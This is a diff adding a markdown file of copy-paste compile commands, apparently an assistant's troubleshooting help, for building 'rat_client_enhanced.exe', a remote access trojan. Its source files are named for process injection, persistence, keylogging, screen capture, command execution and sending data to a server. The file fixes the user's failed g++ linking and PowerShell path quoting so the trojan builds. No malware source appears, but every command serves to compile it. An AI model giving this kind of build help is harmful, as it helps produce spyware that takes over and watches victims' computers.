@@ -1,0 +1,46 @@
+# EXACT COMMAND TO COPY AND PASTE:
+
+## OPTION 1: PowerShell WITH QUOTES (RECOMMENDED)
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -o rat_client_enhanced.exe main.cpp process_utils.cpp injection.cpp persistence.cpp utils.cpp keyboard.cpp exec_command.cpp send_to_server.cpp screen_capture.cpp send_file.cpp file_download.cpp file_browser.cpp -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11
+```
+
+## OPTION 2: Command Prompt (CMD) - No PowerShell issues
+```cmd
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -o rat_client_enhanced.exe main.cpp process_utils.cpp injection.cpp persistence.cpp utils.cpp keyboard.cpp exec_command.cpp send_to_server.cpp screen_capture.cpp send_file.cpp file_download.cpp file_browser.cpp -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11
+```
+
+## CHANGES FROM YOUR FAILED COMMAND:
+
+1. **ADDED `file_browser.cpp`** to the file list (this was missing!)
+2. **REMOVED `-lkernel32`** (linked automatically)
+3. **REMOVED `-lntdll`** (not needed)
+4. **USE QUOTES** around path with spaces
+
+## IF YOU STILL GET ERRORS, TRY THIS SIMPLIFIED VERSION:
+
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c process_utils.cpp -o process_utils.o
+g++ -c file_browser.cpp -o file_browser.o
+g++ -o rat_client_simple.exe main.cpp process_utils.o file_browser.o injection.o persistence.o utils.o keyboard.o exec_command.o send_to_server.o screen_capture.o send_file.o file_download.o -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11
+```
+
+## OR USE EXISTING COMPILE SCRIPT:
+
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+.\compile.bat
+```
+
+## QUICK FIX FOR POWERShell PATH ISSUE:
+
+The problem is PowerShell interprets "C+" as a parameter. You MUST use quotes:
+- ❌ WRONG: `cd C:\Users\Administrator\Desktop\CLI C+ Root\rootserver`
+- ✅ CORRECT: `cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"`
+
+Or use the 8.3 short name:
+```powershell
+cd C:\Users\ADMINI~1\Desktop\CLIC+~1\rootserver
